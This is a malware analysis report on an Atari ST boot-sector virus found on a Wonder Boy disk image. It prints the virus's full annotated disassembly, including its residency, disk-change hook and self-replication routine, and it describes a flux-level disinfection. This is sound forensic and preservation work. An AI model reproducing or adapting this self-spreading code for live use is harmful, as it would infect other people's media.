# Disk 1 boot sector — `bin/wb_disk1_bootsector.bin`

SHA1 `985f7027a76c36bcca1022495cfb90d663f7ca9d`, 512 bytes, dumped from an original single-sided
Wonder Boy in Monsterland (1989, Activision) disk 1.

## 0. Headline: this is not the game's loader, and not a Copylock

The investigation was scoped as "reverse the Copylock boot loader". The code refutes that premise on
every axis, and the refutation is cheap to check:

| Expected of a Rob Northen trace-vector Copylock | Found in these 512 bytes |
|---|---|
| `move #$xx00,sr` / `ori #$8000,sr` enabling trace | **none** — no write to SR at all |
| writes to vectors `$10` / `$20` / `$24` | **none** — no reference below `$140` |
| `illegal` (`$4afc`), `rte`, `stop` | **none of the three appear** |
| encrypted body, high entropy | code region `$1e..$1cb` is **5.79 bits/byte, 124 distinct values** — ordinary 68k |
| raw WD1772 / DMA access `$ffff8604/8606` | **none** — no `ff86`, `ff88`, `fffa`, `ff8a` byte pair anywhere |
| loads the game | **loads nothing**; it `rts`-es straight back to TOS |

What it actually is: a **self-replicating Atari ST boot-sector virus**. It installs 430 bytes of
resident code at `$140`, hooks `hdv_bpb`, and rewrites the boot sector of every floppy the machine
touches. Its only payload is a prank on the mouse.

The game is not loaded by the boot sector at all. Disk 1 carries `AUTO/SWB.PRG` (136,979 bytes) —
that is the binary this project has been reversing (`recreate/project.toml`, `run.sh`), and it is
loaded by TOS's ordinary AUTO-folder scan. A boot sector that merely returns to TOS therefore still
starts the game, which is exactly why the infection went unnoticed on this disk.

### Corollary: the authentic disk-1 boot sector is still lost

`disk_check_signature` (`$5e3e`, verified below) reads track 0 / sector 1 and requires the **word at
boot-sector offset 2 to be `$face`**. Three candidate boot sectors, none of which satisfy it:

| source | bytes at +0 | word at +2 | what it is |
|---|---|---|---|
| this dump | `60 1c` | `$0000` | the virus (OEM field zeroed by the virus's own image) |
| `bin/wb_disk1.st` (preservation dump) | `60 38` | `$4c6f` = `"Lo"` | **SAGROTAN 4.14** anti-virus boot sector, by Henrik Alt, Gaildorf |
| genuine Activision master | — | `$face` **required** | **not preserved anywhere in this workspace** |

So the story the workspace had is one step off. The TOSEC boot sector was not overwritten by
SAGROTAN at random — SAGROTAN is an *anti-virus* ("Bootprogramm zum Schutz vor Virenbefall", with
strings `Kein Virus im Bootsektor` / `Der Bootsektor wurde verändert` in the `.st` at `+$150`). It
overwrote that disk's boot sector because **that disk was infected too**. Both surviving disk-1 boot
sectors are post-infection artifacts: one still carrying the virus, one carrying its disinfectant.

The BPB is intact and identical in both (512 bps, 2 spc, 1 reserved, 2 FATs, 112 dir entries, 800
sectors, 5 spf, **10 spt, 1 side**) — the virus preserves `+$0b..+$1d` and only overwrites the branch
and the code area, which is why the disk still mounts.

## 1. Layout and the relocation that defines the address space

```
+$000        60 1c                       bra.s   +$1e
+$002..$00a  00 00 00 00 00 00 b4 26 4b  OEM = 6 zero bytes; serial $b4264b
+$00b..$01d  BPB (see table above)
+$01e..$1cb  430 bytes of code, copied verbatim to $140 at install time
+$1cc..$1cd  ff 00                       2 bytes the replicator copies but the installer never writes (§6.3)
+$1ce..$1fd  zero
+$1fe        96 4e                       checksum word: 256-word big-endian sum = $1234 (verified)
```

Two different address spaces are in play and conflating them makes the listing unreadable:

* **Install time** the code runs wherever TOS put the sector (a 512-byte buffer). Only the prologue
  `+$1e..+$6d` executes here, and it is position-independent — `lea -12(pc),a2` (`+$28`),
  `lea +$24(pc),a0` (`+$48`), `bsr.s` (`+$6a`). That is the position-independence the task asked to
  confirm; note it is confined to the prologue.
* **After the copy** everything lives at the fixed absolute address `$140`. The resident body is
  position-**dependent**: it addresses itself with absolute-short operands (`$2e2`, `$2e6`, `$2ea`,
  `$20e`), so it only works at `$140`.

Mapping used throughout: **runtime address = boot offset + `$122`**.

`$140..$2ED` is a deliberate hiding place. Vectors `$100..$13F` are the MFP's eight autovectors;
`$140..$3FF` is unused user-interrupt-vector space that TOS neither initialises nor clears, and that
survives a warm reset. System variables proper start at `$400`.

## 2. Annotated disassembly

Columns: `boot offset / runtime address : bytes  mnemonic  ; why`.
Verified against `tools/prg_dis.py` (the 512 bytes wrapped in a synthetic PRG header, `--base 0x122`);
every branch target in the listing lands on an instruction boundary, which is the cross-check that
the linear sweep never desynced.

### 2.1 Installer — runs once, in the TOS boot buffer

```
+$01e $140: 263c 000000d6      move.l  #$d6,d3           ; 214 -> dbf runs 215 times -> 430 bytes
+$024 $146: 43f8 0140          lea     $140.w,a1         ; fixed destination, inside the vector table
+$028 $14a: 45fa fff4          lea     -12(pc),a2        ; = buffer+$1e = self. PC-relative: the only
                                                         ; way to find yourself in an unknown buffer
+$02c $14e: 2412               move.l  (a2),d2
+$02e $150: b491               cmp.l   (a1),d2           ; RESIDENCY CHECK: first longword already at $140?
+$030 $152: 6700 003a          beq.w   +$6c              ; yes -> do nothing, just rts (no double install)
+$034 $156: 203c 31415926      move.l  #$31415926,d0     ; TOS `resvalid` magic
+$03a $15c: 4281               clr.l   d1
+$03c $15e: b0b8 0426          cmp.l   $426.w,d0         ; was a reset vector already armed?
+$040 $162: 6600 0006          bne.w   +$48              ; no -> d1 stays 0
+$044 $166: 2238 042a          move.l  $42a.w,d1         ; yes -> remember the old resvector so we can chain
+$048 $16a: 41fa 0024          lea     +$24(pc),a0       ; = buffer+$6e -- patches the IMAGE, before the copy,
+$04c $16e: 2081               move.l  d1,(a0)           ;   so the value rides along into $190
+$04e $170: 243c 00000194      move.l  #$194,d2
+$054 $176: 21c2 042a          move.l  d2,$42a.w         ; resvector := $194 (our reset handler, §2.2)
+$058 $17a: 21c0 0426          move.l  d0,$426.w         ; resvalid  := $31415926 -> survive warm reset
+$05c $17e: 32da               move.w  (a2)+,(a1)+       ; the relocation: buffer+$1e -> $140, 430 bytes
+$05e $180: 51cb fffc          dbf     d3,+$5c
+$062 $184: 21fc fffffffb 02ea move.l  #$fffffffb,$2ea.w ; infection counter := -5 (§2.4)
+$06a $18c: 6164               bsr.s   +$d0              ; install the hdv_bpb hook (§2.3)
+$06c $18e: 4e75               rts                       ; back to TOS. Boot continues normally; nothing loaded.
+$06e $190: 00000000           dc.l    0                 ; slot for the saved old resvector (patched at +$4c)
```

### 2.2 Reset handler — entered from `resvector` ($194) on a warm reset

```
+$072 $194: 2278 042e          movea.l $42e.w,a1         ; phystop
+$076 $198: 93fc 00008000      suba.l  #$8000,a1         ; -32K = the default screen base
+$07c $19e: 93fc 00000200      suba.l  #$200,a1          ; -512 = the 512 bytes just below screen RAM
+$082 $1a4: 2209               move.l  a1,d1             ; keep the base
+$084 $1a6: 22fc 12123456      move.l  #$12123456,(a1)+  ; rendezvous magic (UNRESOLVED -- §6.1)
+$08a $1ac: 22c1               move.l  d1,(a1)+          ; ...followed by its own address
+$08c $1ae: 47fa 0042          lea     $1f2(pc),a3       ; PC-relative: correct now that we ARE at $140
+$090 $1b2: 49fa 005a          lea     $20e(pc),a4
+$094 $1b6: 32db               move.w  (a3)+,(a1)+       ; copy the 28-byte hook installer ($1f2..$20d) up
+$096 $1b8: b7cc               cmpa.l  a4,a3
+$098 $1ba: 6dfa               blt.s   $1b6
+$09a $1bc: 47fa ff82          lea     $140(pc),a3
+$09e $1c0: 22cb               move.l  a3,(a1)+          ; ...and a pointer back to the resident body
+$0a0 $1c2: 2641               movea.l d1,a3
+$0a2 $1c4: 4240               clr.w   d0
+$0a4 $1c6: 343c 00fe          move.w  #$fe,d2           ; 255 iterations
+$0a8 $1ca: d05b               add.w   (a3)+,d0          ; sum the first 255 words of the 512-byte block
+$0aa $1cc: 51ca fffc          dbf     d2,$1ca
+$0ae $1d0: 343c 5678          move.w  #$5678,d2         ; NOT $1234 -- this block is not a boot sector
+$0b2 $1d4: 9440               sub.w   d0,d2
+$0b4 $1d6: 3682               move.w  d2,(a3)           ; word 256 forced so the 256-word sum = $5678
+$0b6 $1d8: 21fc 00000000 0426 move.l  #0,$426.w         ; disarm resvalid so TOS does not re-enter us
+$0be $1e0: 227a ffae          movea.l $190(pc),a1       ; the old resvector saved at install time
+$0c2 $1e4: b3fc 00000000      cmpa.l  #0,a1
+$0c8 $1ea: 6600 0004          bne.w   $1f0
+$0cc $1ee: 4ed6               jmp     (a6)              ; DEAD/BUGGY: a6 is undefined here (§6.2)
+$0ce $1f0: 4ed1               jmp     (a1)              ; chain to whoever owned resvector before us
```

### 2.3 Hook installer ($1f2) — called from the installer and re-executed from the stashed copy

```
+$0d0 $1f2: 21fc 31415926 0426 move.l  #$31415926,$426.w ; re-arm resvalid
+$0d8 $1fa: 2038 0472          move.l  $472.w,d0         ; hdv_bpb -- called by TOS on every media change
+$0dc $1fe: 41f8 02e2          lea     $2e2.w,a0
+$0e0 $202: 2080               move.l  d0,(a0)           ; SELF-MODIFYING: $2e2 is the operand of the
                                                         ; `jmp $xxxxxxxx.l` at $2e0 (§2.4 tail). The chain
                                                         ; to the original handler IS the jmp's operand.
+$0e2 $204: 41f8 020e          lea     $20e.w,a0
+$0e6 $208: 21c8 0472          move.l  a0,$472.w         ; hdv_bpb := $20e
+$0ea $20c: 4e75               rts
```

### 2.4 The hook ($20e) — read the boot sector, infect it, write it back

```
+$0ec $20e: 302f 0004          move.w  4(a7),d0          ; hdv_bpb's device argument (sp+0 = return address)
+$0f0 $212: b07c 0002          cmp.w   #2,d0
+$0f4 $216: 6c00 00c8          bge.w   $2e0              ; dev >= 2 (hard disk) -> chain out, floppies only
+$0f8 $21a: 48e7 7dff          movem.l d1-d5/d7/a0-a7,-(a7)   ; 14 registers = 56 bytes (see §6.4)
+$0fc $21e: 3e00               move.w  d0,d7             ; keep the device number
+$0fe $220: 2f3c 00000001      move.l  #1,-(a7)          ; sideno = 0, count = 1   (one long, two args)
+$104 $226: 2f3c 00010000      move.l  #$10000,-(a7)     ; sectno = 1, trackno = 0 (one long, two args)
+$10a $22c: 3f07               move.w  d7,-(a7)          ; devno
+$10c $22e: 42a7               clr.l   -(a7)             ; filler
+$10e $230: 4bf8 04c6          lea     $4c6.w,a5         ; _dskbufp
+$112 $234: 2a55               movea.l (a5),a5           ; TOS's own 1 KB disk buffer -- no memory allocated
+$114 $236: 2c4d               movea.l a5,a6             ; a6 keeps the buffer base for the checksum pass
+$116 $238: 2f0d               move.l  a5,-(a7)          ; buf
+$118 $23a: 3f3c 0008          move.w  #8,-(a7)
+$11c $23e: 4e4e               trap    #14               ; XBIOS Floprd(buf,0,dev,sect=1,track=0,side=0,n=1)
+$11e $240: dffc 00000014      adda.l  #$14,a7           ;   = read THE BOOT SECTOR of the disk just inserted
+$124 $246: 4a40               tst.w   d0
+$126 $248: 6b00 0092          bmi.w   $2dc              ; read error (no disk) -> chain out silently
+$12a $24c: 3abc 601c          move.w  #$601c,(a5)       ; force the branch to +$1e -- makes the sector
                                                         ; executable and pins the entry point
+$12e $250: dbfc 0000001e      adda.l  #$1e,a5           ; leave bytes +$02..+$1d (OEM + BPB) INTACT:
                                                         ; the disk keeps its geometry and still mounts
+$134 $256: 49fa fee8          lea     $140(pc),a4       ; source = the live resident body
+$138 $25a: 47fa 0094          lea     $2f0(pc),a3       ; end bound (2 bytes past the body -- §6.3)
+$13c $25e: 3adc               move.w  (a4)+,(a5)+       ; write ourselves into the sector image
+$13e $260: b9cb               cmpa.l  a3,a4
+$140 $262: 6dfa               blt.s   $25e
+$142 $264: 2a4e               movea.l a6,a5             ; back to the buffer base
+$144 $266: 323c 00fe          move.w  #$fe,d1           ; 255 iterations
+$148 $26a: 303c 1234          move.w  #$1234,d0
+$14c $26e: 905d               sub.w   (a5)+,d0          ; d0 = $1234 - sum(first 255 words)
+$14e $270: 51c9 fffc          dbf     d1,$26e
+$152 $274: 3a80               move.w  d0,(a5)           ; word 256 -> the sector is now EXECUTABLE by TOS
+$154 $276: 2f3c 00000001      move.l  #1,-(a7)          ; identical parameter block to the read
+$15a $27c: 2f3c 00010000      move.l  #$10000,-(a7)
+$160 $282: 3f07               move.w  d7,-(a7)
+$162 $284: 42a7               clr.l   -(a7)
+$164 $286: 2f0e               move.l  a6,-(a7)
+$166 $288: 3f3c 0009          move.w  #9,-(a7)
+$16a $28c: 4e4e               trap    #14               ; XBIOS Flopwr -- THE INFECTION
+$16c $28e: dffc 00000014      adda.l  #$14,a7
+$172 $294: 4a40               tst.w   d0
+$174 $296: 6b00 0044          bmi.w   $2dc              ; write-protected -> give up quietly (see §5)
+$178 $29a: 06b8 00000001 02ea addi.l  #1,$2ea.w         ; count the infection
+$180 $2a2: 0cb8 00000005 02ea cmpi.l  #5,$2ea.w         ; started at -5 -> first trigger on the 10th,
+$188 $2aa: 6600 0030          bne.w   $2dc              ;   then every 5th thereafter
+$18c $2ae: 42b8 02ea          clr.l   $2ea.w
+$190 $2b2: 3f3c 0022          move.w  #$22,-(a7)
+$194 $2b6: 4e4e               trap    #14               ; XBIOS Kbdvbase -> KBDVECS in d0
+$196 $2b8: 548f               addq.l  #2,a7
+$198 $2ba: d0bc 00000010      add.l   #$10,d0           ; KBDVECS + 16 = mousevec
+$19e $2c0: c188               exg     d0,a0
+$1a0 $2c2: 2f10               move.l  (a0),-(a7)        ; Initmous arg 3: the CURRENT mouse handler, so the
                                                         ; mouse keeps working -- only its behaviour changes
+$1a2 $2c4: 487a 0020          pea     $2e6(pc)          ; Initmous arg 2: the param block
+$1a6 $2c8: 2f3c 00000001      move.l  #1,-(a7)          ; TRICK: one long supplies BOTH the XBIOS opcode
                                                         ; (high word $0000 = Initmous) and type = 1 (relative)
+$1ac $2ce: 4e4e               trap    #14
+$1ae $2d0: dffc 0000000c      adda.l  #$c,a7            ; 12 bytes -- confirms the opcode came from the long
+$1b4 $2d6: 0a38 0001 02e6     eori.b  #1,$2e6.w         ; toggle `topmode` 1<->0 == FLIP THE MOUSE Y AXIS
+$1ba $2dc: 4cdf 7ffe          movem.l (a7)+,d1-d7/a0-a6 ; mask mismatch with the push -- §6.4
+$1be $2e0: 4ef9 00e01914      jmp     $e01914.l         ; operand patched at $202 = the original hdv_bpb
+$1c4 $2e6: 01 01 01 01        Initmous MOUSE block: topmode=1, buttons=1, xthresh=1, ythresh=1
+$1c8 $2ea: ff ff ff fb        infection counter, longword, -5
+$1cc $2ee: ff 00              never written by the installer (§6.3)
```

## 3. Protection-structure narrative

There is no protection structure here. The structure is a virus, and it is textbook:

1. **Residency check** (`$14e`) so a second boot does not reinstall.
2. **Relocate into the vector table** at `$140` — memory TOS neither uses nor clears, and which
   survives a warm reset.
3. **Two persistence hooks.** `resvalid`/`resvector` (`$426`/`$42a`) carry it across Ctrl-Alt-Del;
   `hdv_bpb` (`$472`) is the propagation trigger, because TOS calls it on every media change.
4. **Chain, never replace.** Both hooks save the previous value and jump to it — the `hdv_bpb` chain
   is the operand of a self-modified `jmp` at `$2e0`, which is why `$2e2` still holds `$00e01914` in
   this image: **the last machine to infect this disk was running a TOS whose `hdv_bpb` pointed at
   ROM address `$E01914`**. That is a forensic fingerprint of the infecting machine, not code.
5. **Replicate** through XBIOS `Floprd`/`Flopwr` only — never touching hardware, so it works on any
   TOS and any drive, and is invisible to anything watching the FDC.
6. **Preserve the BPB** so the host disk still mounts and the infection stays silent.
7. **Fix the checksum to `$1234`** so TOS keeps executing the sector.
8. **Payload**: every 5th infection (first on the 10th), re-issue `Initmous` with `topmode` flipped,
   reversing the mouse's vertical direction. Non-destructive, prank-grade, and the single most
   recognisable ST virus symptom of the era.

**Family identification.** Behaviourally this is the ST "reverse mouse" boot virus — the `hdv_bpb`
infector whose only payload is inverting the mouse Y axis, generally catalogued as the *Ghost* virus
family. Identification here is by behaviour (`$140` residency + `hdv_bpb` + `Initmous` topmode flip
+ 5-count trigger), not by a signature database; no offline ST virus signature set is available in
this workspace. Treat the family name as probable, the behaviour as certain.

### Disk 2 is clean — and the virus's own logic explains why

Disk 2's boot sector (decoded from `gw/dumps/wb_disk2/wb_disk2.scp`) is **blank**: `boot+0 = 0000`,
256-word checksum `0x496b` (not `$1234`, so TOS never executes it), all 430 code bytes zero, and the
virus's `$140` body appears nowhere on the disk. Only disk 1 carries the infection.

That asymmetry is not luck — it is the virus obeying the write-protect tab. The infector aborts
silently on a `Flopwr` error (`$296: bmi.w $2dc`, §2.4), so a **write-protected** disk cannot be
infected. Disk 1 is the boot/key disk (write-enabled, booted constantly → infected); disk 2 is a
pure data disk that was almost certainly kept write-protected, so every media-change infection
attempt on it failed quietly. The clean blank boot sector is disk 2's untouched factory state.

**Propagation caveat for the written copies.** Writing disk 1 back from its `.scp` reproduces the
infected boot sector verbatim, so the freshly written floppy **also carries the virus** and installs
it on boot. The game does not need that sector (it boots from `AUTO/SWB.PRG`; the Copylock lives on
the cyl 0-4 data band, not the boot sector), so a disinfected disk-1 image — boot sector zeroed,
BPB kept — would play identically and spread nothing. Until then, keep other disks write-protected
when running the disk-1 copy; that is exactly what spared disk 2.

### The reference STX is not virus-infected — it is SAGROTAN-disinfected

`projects/wonderboy/bin/Wonderboy…[a][!].stx`'s boot sector is **SAGROTAN 4.14**, a German
anti-virus immunizer (author Henrik Alt; boot+2 `$4c6f` = "Lo", checksum `$1234`, strings
`Bootprogramm zum Schutz vor Virenbefall` / `Kein Virus im Bootsektor`). The Ghost virus code is
absent. So that disk was *disinfected by an anti-virus* which installed its own boot checker — a
third distinct disk-1 boot sector (virus / SAGROTAN / factory-`$face`), and further proof the
genuine loader is preserved nowhere here.

### The disinfected image — built and tested

`gw/dumps/wb_disk1/wb_disk1_disinfected.st` (regenerate: `gw convert --format atarist.400
wb_disk1.scp`, then zero boot bytes `+$00..$0a` and `+$1e..$1ff`, keep the BPB `+$0b..$1d`).
Result: boot checksum `0x1892` (≠ `$1234`, so TOS never runs it), the `$140` virus body gone, and
**every byte after the boot sector byte-identical to the working image** (FAT, root, all files
untouched — only the 512-byte boot sector changed). (mtools reports "non DOS media" on this *and* the un-disinfected image — that is mtools not parsing
Atari boot sectors, not corruption.)

**But a plain `.st` does NOT play on a real Atari ST — it black-screens.** The Copylock *is*
enforced on hardware; Hatari's `.st` emulation was simply more lenient (its loader trace showed no
protection reads, which misled an earlier guess). A disinfected playable disk therefore must keep
the cyl 0-4 protection band, so the disinfection has to happen **at the flux level**, not on a plain
sector image.

### The working disinfection — flux-level boot-sector splice

`gw/dumps/wb_disk1/wb_disk1_disinfected.scp` is the source flux with **only track 0's boot-sector
data field replaced** (in-place IBM-MFM splice: decode track 0.0, swap sector 1's 512 data bytes +
recompute its CRC, re-emit that track's flux; every other track — including the fuzzy Copylock band
on cyls 1-4 — copied bit-for-bit). Verified: the `atarist.400`/`atarist.440` decodes are identical
to the original except the boot sector; cyls 0 and 4 still carry their 12-sector protection layout;
boot checksum `0x1892` (≠ `$1234`); virus body gone. Write it with the flux route that already
proved itself on hardware:

```
./write_disk.sh dumps/wb_disk1/wb_disk1_disinfected.scp --tracks c=0-79:h=0
```

The MFM encoder was validated by re-encoding the *original* boot data and reproducing the recorded
bits exactly, so the swap is bit-exact. Track 0's re-emitted revolution runs ~0.4% longer, which the
drive's own rotation absorbs on write. The plain `wb_disk1_disinfected.st` remains valid for
mounting/archival — just not for booting a real ST.

## 4. READ TRACK: not this sector, and the elimination is complete

The Hatari log `fdc stx : no track image for read track drive=0 track=0/4 side=0` is a genuine
WD1772 **Type III Read Track (`$Ex`)**. It does not come from the boot sector, and it does not come
from any code this workspace can read. The elimination:

**The boot sector is exonerated absolutely.** It contains no reference to `$ffff8600-$ffff860f`, to
the PSG, or to the MFP — scanned for the byte pairs `ff86`, `ff88`, `fffa`, `ff8a`, zero hits. Every
disk access is XBIOS `Floprd`/`Flopwr`. It cannot issue an FDC command.

**The game's plaintext driver is exonerated by enumeration.** `$5e3e..$64f0` is the raw FDC/DMA
driver, and `$6462` (`move.w d1,$ff8604`) is the **only** write to the FDC data register in the whole
image. Every command therefore arrives in `d1`, and every immediate loaded into `d1` in that range is
enumerable:

| value | WD1772 command | site |
|---|---|---|
| `$01` | Type I Restore, no verify, 12 ms | `$63c0` region |
| `$05` | Type I Restore with verify, 6 ms | `fdc_restore` `$6408` |
| `$11` | Type I Seek (track number pre-loaded into the data register via `$ffff8606 := $86`) | `$63c0` |
| `$51` | Type I Step In, update, 12 ms | `$637e` |
| `$80` | Type II Read Sector, single record | `$6488` region |
| `$90` | Type II Read Sector, **multiple record** | `$6118` track-read core |
| `$d0` | Type IV Force Interrupt | `fdc_force_interrupt` `$647a` |
| `$0b`, `$0d` | *not commands* — DMA sector counts, written while `$ffff8606 = $90` selects the sector-count register | `$6118`, `$6488` |

**No `$Cx` (Read Address), no `$Ex` (Read Track), no `$Fx` (Write Track) anywhere in the plaintext
image.** Note the game reads a whole track *without* Read Track: `$6118` sets a DMA sector count of
13 and issues `$90` Read Sector multiple-record, then `fdc_wait_irq_bounded` aborts it on a DMA
address bound (`fdc_dma_end_track`) so the stream stops after the 10 data sectors and before sector
IDs 11/12. That is a deliberate design — it is how the driver reads a 12-sector track while
*avoiding* the two protection sectors.

**By elimination the `$Ex` comes from the encrypted Copylock body, `$ed8e..$f540`.** That is the only
executable code in the system that cannot be read statically (it exists as plaintext one longword at
a time under the trace handler — see `notes/architecture.md` §2.5), and it is exactly where a Copylock
would put a raw track read: capturing weak/fuzzy bits requires reading the raw track, because the
fuzzy sectors return different data every revolution and no sector-level read can expose that.

Everything else fits. Cylinders 0-4 carry the 12-sector protected format, and tracks **0 and 4** are
its two ends — the natural pair to sample. `fdc_restore` (`$6408`) leaves the head on track 0, and it
is called from the Copylock's failure path at `$f56a`. And the observed black-screen hang is the
Copylock hanging, reached through `AUTO/SWB.PRG` → `load_resource_by_index` → `copylock_entry`
(`$e7bc`) on the first resource load — **not** the boot sector, which by then has long since returned
to TOS.

This is consistent with, and independently corroborates, the existing project finding that
`copylock_key_check`'s `d0` "is produced inside the encrypted body from the fuzzy protection
sectors" (`names.txt` `$f552`).

## 5. RAM footprint and the handoff question — the answer is no

What the boot sector leaves behind:

| address | size | contents |
|---|---|---|
| `$140..$2ED` | 430 B | the resident virus body |
| `$190` | 4 | saved previous `resvector` |
| `$2E2` | 4 | saved previous `hdv_bpb` — also the operand of the `jmp` at `$2E0` |
| `$2E6` | 4 | `Initmous` MOUSE block, `$01010101`, low byte toggled by the payload |
| `$2EA` | 4 | infection counter, initialised to `-5` |
| `$426` / `$42A` | 4+4 | `resvalid` = `$31415926`, `resvector` = `$194` |
| `$472` | 4 | `hdv_bpb` = `$20E` |
| `phystop-$8200` | 512 | **warm reset only**: magic `$12123456`, self-pointer, the 28-byte hook installer, a pointer to `$140`, checksum forced to `$5678` |

**Nothing in the game reads any of it.** Verified three ways:

1. Scanned every absolute operand (`.w` and `.l` forms) in `out/wonderboy_dis.txt` for a value in
   `$140..$2ED`: **3 hits, all three linear-sweep artifacts inside the high graphics/data region**
   (`$14b04`, `$14ba4`, `$183b0`; the first decodes as an invalid `ori?` and none is reachable code).
2. Searched the image and `AUTO/SWB.PRG` for the constants `$12123456`, `$31415926` and `$5678`:
   zero occurrences of the first two, and the `5678` hits are coincidental byte pairs inside
   unrelated instructions (`$f048`, `$15678`).
3. The only genuine low-memory references the game makes are CPU vectors below `$100` and the MFP
   ACIA/keyboard vector `$118` — never `$140..$3FF`.

The two are in fact **mutually destructive, in the game's favour**. `SWB.PRG` relocates its body to
absolute `$400` (`recreate/project.toml`), which overwrites the TOS system-variable page — including
`resvalid` (`$426`), `resvector` (`$42a`) and `hdv_bpb` (`$472`). The moment the game starts, all
three virus hooks are gone; the 430-byte body at `$140` is simply orphaned. The game's stacks are at
`$80000` (`$7008`, `$f8c0`), so nothing grows down into `$140` either. The virus is inert under the
game and the game is unharmed by the virus.

**Slot 61 specifically.** `actor_behavior_type61` (`$6f9e`) — reached by the hidden short-absolute
`jsr $6f9e.w` at `$f56e` in `copylock_key_check`'s failure path — reads only its actor record, the
byte `$7014` and the message table `$7016`, then posts messages `$72..$75` and restarts via
`show_data_disk_prompt`. It is the protection's **failure UI**, not a key reader. It consults no
boot-sector RAM, and there is no key handoff for it to consult.

**Conclusion for the protection chain:** the boot sector plays no part in it. Wonder Boy's copy
protection is entirely self-contained in `SWB.PRG` — the Copylock at `$ecba..$f574` reads the fuzzy
sectors itself through the game's own raw FDC driver plus (by elimination) its own Read Track. The
`$face` check at `$5e3e` is the *only* place the protection ever looks at a boot sector, and it wants
a signature this dump does not carry.

## 6. Unresolved

### 6.1 The warm-reset block at `phystop-$8200` (`$12123456` / `$5678`)

The reset handler builds a 512-byte structure just below screen RAM: magic `$12123456`, a pointer to
itself, a copy of the 28-byte hook installer, a pointer to `$140`, and a checksum forced to `$5678`.
**Nothing in these 512 bytes ever looks for that magic**, and neither does the game. The purpose is
unresolved. Most likely a rendezvous for another component of the virus family (a companion `.PRG`,
or a later generation), or vestigial code inherited from a parent strain. Resolving it would need an
ST virus corpus to diff against, which this workspace does not have. Note the checksum target is
`$5678` and not `$1234`, so the block is explicitly *not* meant to be written out as a boot sector.

### 6.2 `jmp (a6)` at `$1ee`

Taken only when the saved previous `resvector` (`$190`) is zero, i.e. when no reset vector was armed
before infection. `a6` is never loaded on that path, so it jumps to a garbage address. A latent bug;
harmless in practice because the installer sets `resvalid`/`resvector` itself before the handler can
ever run. Not worth further effort, but it is a real defect and not a decode error.

### 6.3 Two uninitialised bytes at `$2EE`

The installer copies 430 bytes (`$140..$2ED`), but the replicator's end bound is `a3 = $2f0`, so it
copies **432** (`$140..$2EF`). Bytes `$2EE/$2EF` are therefore never written by the installer, yet
are propagated into every child sector — landing at boot offset `+$1cc`, which in this dump is
`ff 00`. That is whatever was in the vector table of the machine that infected this disk. It is dead
weight (never executed, and the checksum pass compensates), but it means **two bytes of every
infected boot sector are non-deterministic**, so byte-exact comparison against another sample of this
virus should exclude `+$1cc..+$1cd`.

### 6.4 Asymmetric `movem` masks

Push at `$21a` is `$7dff` = `d1-d5/d7/a0-a7`; pop at `$2dc` is `$7ffe` = `d1-d7/a0-a6`. Both move 14
registers, so `a7` lands correctly and the chained `hdv_bpb` sees a valid stack — but the *contents*
are shifted by one register from `d6` onward (`d6` receives the saved `d7`, `d7` receives `a0`, and
`a0..a6` receive `a1..a7`). `d6` is conspicuously the one register the push omits, so `$7dff` looks
like a typo for `$7fff`. Harmless because the ROM `Getbpb` it chains into does not rely on caller
registers, but it is a genuine bug and it should not be "corrected" if this listing is ever used as a
reference — the shipped code really is asymmetric.

### 6.5 The authentic boot sector

Still lost. Recovering it needs another physical disk-1 dump that has *not* been infected or
disinfected. The acceptance test is cheap and unambiguous: **word at offset 2 must equal `$face`**
(`$5e66`). Any candidate failing that is not the master.

### 6.6 Read Track: proven by elimination, not observed

§4 establishes that the `$Ex` cannot come from the boot sector or from any plaintext code, which
leaves only the encrypted body. That is a sound elimination but not a direct observation, because the
ciphertext at `$ed8e..$f540` cannot be disassembled. To observe it directly: run `SWB.PRG` under the
Musashi oracle with trace-exception (`$24`) and illegal (`$10`) emulation live so the Copylock body
actually decrypts, and log every write to `$ffff8604` while `$ffff8606 = $80`, recording the track
register alongside. `recreate/test/test_copylock.py` already measures that the run never returns
under the current trap model, so this needs the trace-decrypt path implemented first — it is the same
prerequisite the existing `PORTABILITY.md` work already books as outstanding. Alternatively, Hatari
with `--trace fdc` against a *real* Pasti STX carrying track images would show the commands directly,
without any reconstruction work at all, and is by far the cheaper of the two.
